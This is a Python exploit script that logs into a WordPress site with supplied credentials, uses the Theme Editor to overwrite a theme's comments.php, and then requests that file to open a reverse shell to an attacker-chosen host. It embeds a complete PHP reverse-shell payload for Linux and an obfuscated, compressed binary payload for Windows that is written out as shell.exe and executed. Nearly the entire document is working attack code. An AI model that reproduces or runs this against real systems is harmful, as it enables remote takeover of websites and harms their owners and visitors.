import requests
import re
import sys
from colorama import init, Fore, Style

init()

banner = '''
 __    __              _   ___                     _____  __     __            _       _ _   
/ / /\ \ \___  _ __ __| | / _ \_ __ ___  ___ ___  /__   \/__\   /__\_  ___ __ | | ___ (_) |_ 
\ \/  \/ / _ \| '__/ _` |/ /_)/ '__/ _ \/ __/ __|   / /\/_\    /_\ \ \/ / '_ \| |/ _ \| | __|
 \  /\  / (_) | | | (_| / ___/| | |  __/\__ \__ \  / / //__   //__  >  <| |_) | | (_) | | |_ 
  \/  \/ \___/|_|  \__,_\/    |_|  \___||___/___/  \/  \__/   \__/ /_/\_\ .__/|_|\___/|_|\__|
                                                                        |_|                  
'''

print(banner)
print("This exploit uses the Theme Editor in WordPress to open a reverse shell.")
print("\n\nUsage:\npython3 wpte_exploit.py http://<IP>:<PORT>/ <USERNAME> <PASSWORD> <THEME_NAME> <LHOST> <LPORT> <TARGET_OS>")
print("====================================================================================================================\n")

target_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
theme = sys.argv[4]
lhost = sys.argv[5]
lport = sys.argv[6]
target_os = sys.argv[7]

if target_os.lower() == "linux":
    php_reverse_code = '''<?php set_time_limit(0);$VERSION="1.0";$ip='{}';$port={};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a;w;id;/bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){{$pid=pcntl_fork();if($pid==-1){{printit("ERROR:Can'tfork");exit(1);}}if($pid){{exit(0);}}if(posix_setsid()==-1){{printit("Error:Can'tsetsid()");exit(1);}}$daemon=1;}}else{{printit("WARNING:Failedtodaemonise.Thisisquitecommonandnotfatal.");}}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){{printit("$errstr($errno)");exit(1);}}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){{printit("ERROR:Can'tspawnshell");exit(1);}}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("Successfullyopenedreverseshellto$ip:$port");while(1){{if(feof($sock)){{printit("ERROR:Shellconnectionterminated");break;}}if(feof($pipes[1])){{printit("ERROR:Shellprocessterminated");break;}}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){{if($debug)printit("SOCKREAD");$input=fread($sock,$chunk_size);if($debug)printit("SOCK:$input");fwrite($pipes[0],$input);}}if(in_array($pipes[1],$read_a)){{if($debug)printit("STDOUTREAD");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT:$input");fwrite($sock,$input);}}if(in_array($pipes[2],$read_a)){{if($debug)printit("STDERRREAD");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR:$input");fwrite($sock,$input);}}}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){{if(!$daemon){{print"$string";}}}}?>'''.format(lhost,lport)
elif target_os.lower() == "windows":
    php_reverse_code = '''<?php header('Content-type: text/plain');$ip="{}";$port="{}";$payload="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";$evalCode=gzinflate(base64_decode($payload));$evalArguments=" ".$port." ".$ip;$tmpdir="C:\\windows\\temp";chdir($tmpdir);$res .="Using dir : ".$tmpdir;$filename="shell.exe";$file=fopen($filename, 'wb');fwrite($file, $evalCode);fclose($file);$path=$filename;$cmd=$path.$evalArguments;$res .="\n\nExecuting : ".$cmd."\n";echo $res;$output=system($cmd);?>'''.format(lhost,lport)
else:
    print(Fore.RED + "[-] " + Style.RESET_ALL + "Only Linux and Windows machines are supported. Exiting now...")
    exit(0)
theme = theme.lower()

s = requests.Session()
r = s.get(target_url + 'wp-login.php')

# log into WordPress Dashboard
data = {
    'log':username,
    'pwd':password,
    'wp-submit':'Log+In',
    'redirect_to':target_url+'wp-admin/',
    'testcookie':'1'
    }

print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Logging in with credentials:\n"  + Fore.YELLOW + "Username: " + Style.RESET_ALL + username + Fore.YELLOW +"\nPassword: " +Style.RESET_ALL + password + "\n")
r = s.post(target_url+'wp-login.php', data=data)
check_result = re.search('<div id="login_error">', r.text)

if check_result != None:
    print(Fore.RED + "[-] " + Style.RESET_ALL + "Authentication failed. Exiting now...")
    exit(0)
print(Fore.GREEN + "[+] " + Style.RESET_ALL + "Successfully authenticated!\n")

# Check whether Theme Editor is enabled
print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Checking whether Theme Editor is enabled...")
r = s.get(target_url+'wp-admin/theme-editor.php/')

if r.status_code != 200:
    print(Fore.RED + "[-] " + Style.RESET_ALL + "Theme Editor is not enabled on this WordPress page. Exiting now...")
    exit(0)
print(Fore.GREEN + "[+] " + Style.RESET_ALL + "Theme Editor is enabled.\n")

# Obtain nonce for comments.php
print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Obtaining WP nonce for file update...")

r = s.get(target_url+f'wp-admin/theme-editor.php?file=comments.php&theme={theme}')
nonce = re.findall(r'<input type="hidden" id="nonce" name="nonce" value="(\w+)"', r.text)
if len(nonce) == 0 :
    nonce = re.findall(r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(\w+)"', r.text)
    if len(nonce) == 0 :
        print(Fore.RED + "[-] " + Style.RESET_ALL + "Failed to retrieve the WP nonce. Exiting now... \n")
        exit(0)

    print(Fore.GREEN + "[+] " + Style.RESET_ALL + "_wpnonce retrieved successfully ! _wpnonce : " + nonce[0] +"\n")

    # Update comments.php file (steps differs depending on version of WordPress)
    print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Updating comments.php file with reverse shell script...")

    data = {
        '_wpnonce':nonce[0],
        '_wp_http_referer': f'/wp-admin/theme-editor.php?file=comments.php&theme={theme}',
        'newcontent': php_reverse_code,
        'action': 'update',
        'file': 'comments.php',
        'theme': theme,
        'scrollto': '1',
        'docs-list': '',
        'submit': 'Update+File'
        }

    r = s.post(target_url+'wp-admin/theme-editor.php', data=data)
    check_result = re.search('true', r.text)
    if check_result == None:
        print(Fore.RED + "[-] " + Style.RESET_ALL + 'Failed to update comments.php file. Exiting now...')
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + 'Successfully updated comments.php file.\n')

else:
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + "WP nonce retrieved successfully ! nonce : " + nonce[0] +"\n")

    # Update comments.php file (steps differs depending on version of WordPress)
    print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Updating comments.php file with reverse shell script...")

    data = {
        'nonce':nonce[0],
        '_wp_http_referer': f'/wp-admin/theme-editor.php?file=comments.php&theme={theme}',
        'newcontent': php_reverse_code,
        'action': 'edit-theme-plugin-file',
        'file': 'comments.php',
        'theme': theme,
        'docs-list': ''
        }

    r = s.post(target_url+'wp-admin/admin-ajax.php', data=data)
    check_result = re.search('true', r.text)
    if check_result == None:
        print(Fore.RED + "[-] " + Style.RESET_ALL + 'Failed to update comments.php file. Exiting now...')
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + 'Successfully updated comments.php file.\n')


input('Have you set up a Netcat listener? (Press Enter to continue)')

# Call comments.php file
print(Fore.GREEN + "\n[+] " + Style.RESET_ALL + 'Opening reverse shell...\n')
try:
    r = s.get(target_url+f'wp-content/themes/{theme}/comments.php', timeout=1)
except:
    pass